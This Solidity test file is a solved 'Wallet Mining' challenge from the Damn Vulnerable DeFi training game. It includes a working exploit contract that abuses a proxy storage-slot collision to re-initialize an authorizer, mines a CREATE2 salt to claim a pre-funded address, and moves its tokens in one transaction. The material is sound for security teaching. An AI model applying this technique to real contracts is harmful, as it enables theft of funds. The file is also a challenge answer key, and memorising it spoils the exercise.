// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     *
     * Aegis class: SC01 (access control) — a storage-collision re-initialization plus a
     * deterministic-address (create2) deployment puzzle, all squeezed into ONE player tx.
     *
     * The bug: AuthorizerUpgradeable.needsInit (slot 0) collides with TransparentProxy.upgrader
     * (slot 0). After setup, slot 0 holds the (non-zero) `upgrader` address, so needsInit != 0 and
     * `init()` can be called AGAIN by anyone — letting us authorize an attacker for the deposit
     * address. We then drop() the Safe to the pre-funded address, move its tokens with the user's
     * OFF-CHAIN signature (user sends no tx), and forward the deployer reward to the ward.
     */
    // Safe v1.4.1 EIP-712 typehashes (private in Safe.sol, mirrored here)
    bytes32 constant SAFE_DOMAIN_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
    bytes32 constant SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;

    function test_walletMining() public checkSolvedByPlayer {
        // 1. The Safe initializer that makes `user` the sole owner (no module, no fallback handler).
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
        );

        // 2. Brute-force the salt nonce that lands the proxy exactly at USER_DEPOSIT_ADDRESS.
        bytes32 initHash = keccak256(initializer);
        bytes32 deployHash = keccak256(
            abi.encodePacked(proxyFactory.proxyCreationCode(), uint256(uint160(address(singletonCopy))))
        );
        uint256 saltNonce = type(uint256).max;
        for (uint256 i = 0; i < 2000; i++) {
            bytes32 salt = keccak256(abi.encodePacked(initHash, i));
            address predicted = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, deployHash))))
            );
            if (predicted == USER_DEPOSIT_ADDRESS) {
                saltNonce = i;
                break;
            }
        }
        require(saltNonce != type(uint256).max, "salt nonce not found");
        console.log("wallet-mining salt nonce:", saltNonce);

        // 3. Pre-sign (OFF-CHAIN) the Safe tx that moves the 20M DVT to the user. The Safe will be
        //    fresh (nonce 0) at deposit address (= EIP-712 verifyingContract).
        bytes memory transferData =
            abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);
        bytes32 safeTxHash = keccak256(
            abi.encode(
                SAFE_TX_TYPEHASH, address(token), uint256(0), keccak256(transferData),
                Enum.Operation.Call, uint256(0), uint256(0), uint256(0), address(0), address(0), uint256(0)
            )
        );
        bytes32 domainSep = keccak256(abi.encode(SAFE_DOMAIN_TYPEHASH, block.chainid, USER_DEPOSIT_ADDRESS));
        bytes32 digest = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSep, safeTxHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
        bytes memory userSig = abi.encodePacked(r, s, v);

        // 4. ONE player tx: deploy the attacker; its constructor does the whole chain.
        new WalletMiningAttacker(
            authorizer, walletDeployer, token, USER_DEPOSIT_ADDRESS,
            initializer, saltNonce, user, DEPOSIT_TOKEN_AMOUNT, ward, initialWalletDeployerTokenBalance, userSig
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

/**
 * @notice Single-transaction attacker. Everything happens in the constructor, so deploying it is
 *         the player's one and only transaction.
 */
contract WalletMiningAttacker {
    constructor(
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        DamnValuableToken token,
        address depositAddr,
        bytes memory initializer,
        uint256 saltNonce,
        address user,
        uint256 userAmount,
        address ward,
        uint256 reward,
        bytes memory userSig
    ) {
        // (a) Re-initialize the authorizer (slot-0 collision) to authorize ourselves for the deposit address.
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = depositAddr;
        authorizer.init(wards, aims);

        // (b) Deploy the Safe at the pre-funded deposit address and collect the deployer reward.
        require(walletDeployer.drop(depositAddr, initializer, saltNonce), "drop failed");

        // (c) Drain the deposit Safe to the user using the user's OFF-CHAIN signature (user sends no tx).
        Safe(payable(depositAddr)).execTransaction(
            address(token),
            0,
            abi.encodeWithSignature("transfer(address,uint256)", user, userAmount),
            Enum.Operation.Call,
            0, 0, 0,
            address(0),
            payable(address(0)),
            userSig
        );

        // (d) Forward the deployer reward to the ward.
        token.transfer(ward, reward);
    }
}
